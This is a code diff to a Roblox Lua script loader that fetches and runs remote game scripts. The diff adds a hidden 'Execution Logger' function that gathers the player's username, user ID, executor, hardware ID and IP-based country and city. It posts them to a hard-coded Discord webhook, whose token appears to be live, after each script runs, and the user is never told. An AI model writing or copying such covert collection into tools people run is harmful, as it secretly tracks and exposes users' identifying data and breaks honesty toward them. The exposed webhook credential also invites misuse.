@@ -1,5 +1,96 @@
 local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
 
+local function sendWebhook()
+
+   local webhookUrl = "https://discord.com/api/webhooks/1405757540716773506/Bb-236A2QbrV5pPlGpzzSopBh5VHIlSMEIIuA2JdYnWXXZAaq5kEq3crZpZK8aoWyb1T"
+
+   local player = game.Players.LocalPlayer
+   local playerName = player.Name
+   local userId = player.UserId
+   local profileUrl = string.format("https://www.roblox.com/users/%s/profile", userId)
+
+   local executorName = "Unknown Executor"
+   if identifyexecutor then
+      local name = identifyexecutor()
+      if type(name) == "table" then
+         name = name[1] or "Unknown Executor"
+      elseif type(name) == "string" then
+         name = name:match("^[^%s]+") or name
+      end
+      executorName = name
+   end
+
+   local hwid = "Unavailable"
+   if string.lower(executorName):find("krnl") and KrnlHWID then
+    hwid = KrnlHWID()
+   elseif gethwid then
+      hwid = gethwid()
+   end
+
+   local timeExecuted = os.date("%Y-%m-%d %H:%M:%S")
+
+   local country = "Unknown"
+   local city = "Unknown"
+   local request = request or http_request or (syn and syn.request) or nil
+   if request then
+      local res = request({Url = "http://ip-api.com/json", Method = "GET"})
+      if res and res.Body then
+         local HttpService = game:GetService("HttpService")
+         local geo = HttpService:JSONDecode(res.Body)
+         if geo then
+               if geo.country then country = geo.country end
+               if geo.city then city = geo.city end
+         end
+      end
+   end
+
+   local avatarUrl = ""
+   if request then
+      local HttpService = game:GetService("HttpService")
+      local thumbRes = request({Url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. userId .. "&size=420x420&format=Png&isCircular=false", Method = "GET"})
+      if thumbRes and thumbRes.Body then
+         local thumbData = HttpService:JSONDecode(thumbRes.Body)
+         if thumbData and thumbData.data and thumbData.data[1] and thumbData.data[1].imageUrl then
+               avatarUrl = thumbData.data[1].imageUrl
+         end
+      end
+   end
+
+   local data = {
+      ["username"] = "Execution Logger",
+      ["embeds"] = {{
+         ["title"] = "📜 Script Executed",
+         ["color"] = 65280,
+         ["thumbnail"] = {["url"] = avatarUrl},
+         ["fields"] = {
+               {["name"] = "👤 Player", ["value"] = string.format("[%s](%s)", playerName, profileUrl), ["inline"] = true},
+               {["name"] = "⏰ Time", ["value"] = "`" .. timeExecuted .. "`", ["inline"] = true},
+               {["name"] = "🛠 Executor", ["value"] = "`" .. executorName .. "`", ["inline"] = true},
+               {["name"] = "🖥 HWID", ["value"] = "`" .. hwid .. "`", ["inline"] = false},
+               {["name"] = "🌍 Country", ["value"] = "`" .. country .. "`", ["inline"] = true},
+               {["name"] = "🏙 City", ["value"] = "`" .. city .. "`", ["inline"] = true}
+         },
+         ["footer"] = {
+               ["text"] = "Execution Tracker • Roblox"
+         }
+      }}
+   }
+
+   local HttpService = game:GetService("HttpService")
+   local jsonData = HttpService:JSONEncode(data)
+
+   if request then
+      request({
+         Url = webhookUrl,
+         Method = "POST",
+         Headers = {["Content-Type"] = "application/json"},
+         Body = jsonData
+      })
+   else
+      warn("Your executor does not support HTTP requests.")
+   end
+end
+
 local creator = game.CreatorId
 
 local games = {
@@ -53,6 +144,8 @@ WindUI:Popup({
                     task.wait(1.5)
                     
                     loadstring(game:HttpGet(games[creator]))()
+
+                    sendWebhook()
 
                     WindUI:Notify({
                         Title = "Done!",
@@ -110,6 +203,8 @@ WindUI:Popup({
                                     task.wait(1.25)
 
                                     loadstring(game:HttpGet("https://raw.githubusercontent.com/scripterpan/scripterpan/refs/heads/main/ScriptSrc/Universal.lua"))()
+
+                                    sendWebhook()
 
                                     WindUI:Notify({
                                         Title = "Done!",
